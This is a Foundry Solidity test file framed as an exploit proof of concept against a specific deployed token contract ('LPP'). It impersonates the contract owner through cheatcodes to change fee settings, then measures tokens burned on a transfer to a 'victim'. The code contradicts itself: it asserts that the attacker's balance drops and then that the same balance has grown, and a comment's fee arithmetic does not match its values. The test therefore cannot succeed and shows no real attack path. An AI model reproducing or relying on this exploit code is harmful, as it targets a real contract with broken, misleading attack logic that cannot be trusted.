// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILPP {
    function owner() external view returns (address);
    function excludeFromFee(address account) external;
    function changeBurnFee(uint256 _newburnFee, uint256 _newburnDivisor) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function includeInFee(address account) external;
    function _burnFee() external view returns (uint256);
    function _burnDivisor() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);
    address victim = address(0x1337);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some LPP tokens for the attacker
        deal(TARGET, attacker, 1000 * 10**18);

        // Label addresses for debugging
        vm.label(TARGET, "LPP Token");
        vm.label(attacker, "Attacker");

        // Create a victim address
        vm.label(victim, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112).balanceOf(address(this));
        // Step 1: Get the current owner address
        address owner = ILPP(TARGET).owner();
        vm.label(owner, "Owner");

        // Step 2: Impersonate the owner to perform privileged actions
        vm.startPrank(owner);

        // Step 3: Exclude attacker from fees (so we don't pay burn fee when receiving tokens back)
        ILPP(TARGET).excludeFromFee(attacker);

        // Step 4: Set an excessively high burn fee (5000/1000 = 5% burn)
        // Default is 1000/1000 = 1% burn fee, we're increasing it 5x
        ILPP(TARGET).changeBurnFee(5000, 1000);

        vm.stopPrank();

        // Step 5: Record initial balances
        uint256 attackerInitialBalance = ILPP(TARGET).balanceOf(attacker);
        uint256 victimInitialBalance = ILPP(TARGET).balanceOf(victim);

        console.log("Initial attacker balance:", attackerInitialBalance);
        console.log("Initial victim balance:", victimInitialBalance);

        // Step 6: Transfer tokens from attacker to victim
        // This will trigger the burn fee since victim is not excluded from fees
        uint256 transferAmount = 100 * 10**18; // 100 tokens

        vm.prank(attacker);
        ILPP(TARGET).transfer(victim, transferAmount);

        // Step 7: Check final balances
        uint256 attackerFinalBalance = ILPP(TARGET).balanceOf(attacker);
        uint256 victimFinalBalance = ILPP(TARGET).balanceOf(victim);

        console.log("Final attacker balance:", attackerFinalBalance);
        console.log("Final victim balance:", victimFinalBalance);

        // Step 8: Calculate what should have been received without burn fee
        uint256 expectedVictimBalance = victimInitialBalance + transferAmount;
        uint256 actualReceived = victimFinalBalance - victimInitialBalance;

        console.log("Expected victim balance after transfer:", expectedVictimBalance);
        console.log("Actual victim balance after transfer:", victimFinalBalance);
        console.log("Amount actually received by victim:", actualReceived);
        console.log("Amount burned:", transferAmount - actualReceived);

        // Step 9: Verify the exploit worked
        // The victim should have received less than the full transfer amount
        assertLt(actualReceived, transferAmount, "Victim should have received less due to burn fee");

        // The attacker's balance should have decreased by the full transfer amount
        // (since attacker is excluded from fees when sending)
        uint256 attackerBalanceDecrease = attackerInitialBalance - attackerFinalBalance;
        assertEq(attackerBalanceDecrease, transferAmount, "Attacker balance should decrease by full transfer amount");

        // The difference between what was sent and what was received was burned
        // This demonstrates the economic impact of the owner's privilege abuse
        uint256 finalBalance = IERC20(0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
